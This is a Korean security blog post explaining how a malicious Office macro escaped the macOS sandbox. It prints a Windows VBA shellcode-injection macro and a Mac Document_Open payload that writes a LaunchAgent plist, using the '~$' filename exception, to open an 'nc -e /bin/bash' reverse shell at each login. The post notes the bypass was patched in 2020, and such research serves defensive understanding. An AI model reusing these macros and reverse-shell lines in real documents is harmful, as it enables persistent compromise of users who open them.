---
layout: post
title:  "MacOs에서 Office Sandbox Bypass"
author: "hkkiw0823"
comments: true
tags: [mac]
---

라온화이트햇 핵심연구팀 강인욱
hkkiw0823@gmail.com

Office 공격이 유행함에 따라 최근 공격자들은 Windows 뿐만 아니라 MacOs까지 호환되도록 범위를 넓혔습니다. 해외에서는 MacOs를 사용하는 유저들이 더 많아서 Windows 만으로는 공격 성공률이 낮습니다. 하지만 지금까지 MacOs에서 Office 공격이 왜 발생하지 않았는지에 대해서 알아보도록 합니다.

* 이 문서에 기술된 시작프로그램 등록 방법은 현재 패치가 이루어져서 작동하지 않습니다.

일반적으로 Windows Macro는 아래와 같이 진행됩니다.

    
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr
    Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long
    
    
    Sub Auto_Open()
            Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long
    #If Vba7 Then
            Dim  Xlbufvetp As LongPtr
    #Else
            Dim  Xlbufvetp As Long
    #EndIf
            Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _
    139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _
    13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _
    116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _
    214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _
    36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _
    139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _
    235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _
    224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _
    187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)
            Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &H1000, &H40)
            For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)
                    Wyzayxya = Hyeyhafxp(Zolde)
                    Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)
            Next Zolde
            Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)
    End Sub

excel.exe에 쉘코드를 삽입 후 CreateThread로 실행을 해주는 모습입니다.

Mac 에서는 아래와 같이 사용할 수 있습니다.

    Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) As LongPtr
    Sub Document_Open()
       system("~~~~")
    End Sub

Mac에서는 더 간단한 것처럼 보이지만 Mac에는 기본적으로 Sandbox가 존재합니다.

Mac에서 아래와 같이 명령어를 입력하면 사용할 수 있는 권한이 나타납니다.

    codesign --display -v --entitlements - /Applications/Microsoft\ Word.app

    ...
    com.apple.security.files.bookmarks.app-scope
    com.apple.security.files.user-selected.read-write
    com.apple.security.network.client
    com.apple.security.personal-information.addressbook
    com.apple.security.print
    ...
    com.apple.security.temporary-exception.sbpl
    (allow file-read* file-write*
    (require-any
    (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$"))
    )
    )

Mac에서는 자체적으로 App마다 SandBox가 있어서 특정 행동을 하기 위해선 권한이 필요합니다. 아마 이 때문에 Mac에서 Office를 이용한 공격이 성행하지 않았던 것으로 보입니다.

위에 있는 Office 권한을 자세히 살펴보면 파일 읽기와 쓰기 권한을 사용할 때 특정 조건이 맞춰지면 사용할 수 있는 것처럼 보입니다.

    ~$xxxx.docx

어디서 많이 본 듯한 파일명입니다. Office의 경우 처음 문서를 열면 기본적으로 임시파일을 "~$파일명"에 생성합니다. 그렇기 때문에 Office를 실행할 때마다 권한 문제를 일으키지 않기 위해 정규식으로 허용해 둔 모습입니다.

이제 저 정규식을 가지고 Sandbox를 우회해봅니다.

MacOs에서는 아래와 같은 폴더에 plist파일을 등록하면 재부팅시 해당 바이너리를 실행하게 됩니다.

![/assets/3f1a9809-588d-4a26-af2c-de70b1c99b27/1548c49d-9949-4c30-81c6-13f126c3ac12launchd_dirs.png](/assets/3f1a9809-588d-4a26-af2c-de70b1c99b27/1548c49d-9949-4c30-81c6-13f126c3ac12launchd_dirs.png)

/System 이나 /Library 는 기본적으로 권한이 없어서 실제 공격시엔 유저 권한인 ~/Library를 이용해야 합니다.

~/Library/LauchAgents에 파일을 작성할 수 있다면 시작프로그램을 등록하여 재부팅할 때마다 악성프로그램이 동작하게 할 수 있습니다.

아래와 같이 plist파일을 작성하여 시작프로그램 폴더에 등록한다면 실제로 재부팅할 때마다 nc로 붙은 것을 확인할 수 있습니다.

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
    <key>Label</key>
    <string>com.xpnsec.escape</string>
    <key>ProgramArguments</key>
    <array>
    <string>python</string>
    <string>-c</string>
    <string>import os; os.system("nc -e /bin/bash xxxxxx 31337")</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    </dict>
    </plist>

최종적인 페이로드는 아래와 같습니다.

    Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) As LongPtr
    Private Sub Document_Open()
    Dim path As String
    Dim payload As String
    payload = "import os; os.system(\"nc -e /bin/bash xxxxxx 31337\")"
    path = Environ("HOME") & "/../../../../Library/LaunchAgents/~$com.xpnsec.plist"
    arg = "<?xml version=""1.0"" encoding=""UTF-8""?>\n" & _
    "<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n" & _
    "<plist version=""1.0"">\n" & _
    "<dict>\n" & _
    "<key>Label</key>\n" & _
    "<string>com.xpnsec.sandbox</string>\n" & _
    "<key>ProgramArguments</key>\n" & _
    "<array>\n" & _
    "<string>python</string>\n" & _
    "<string>-c</string>\n" & _
    "<string>" & payload & "</string>" & _
    "</array>\n" & _
    "<key>RunAtLoad</key>\n" & _
    "<true/>\n" & _
    "</dict>\n" & _
    "</plist>"
    Result = system("echo """ & arg & """ > '" & path & "'", "r”)
    End Sub

2020. 03 기준으로 해당 우회법은 MS Office 측에서 패치를 하여 더 이상 사용할 수 없습니다.

시작프로그램에 등록하는 것은 불가능하지만 문서를 열었을때 쉘을 획득하여 이것저것 할 수는 있어 보입니다.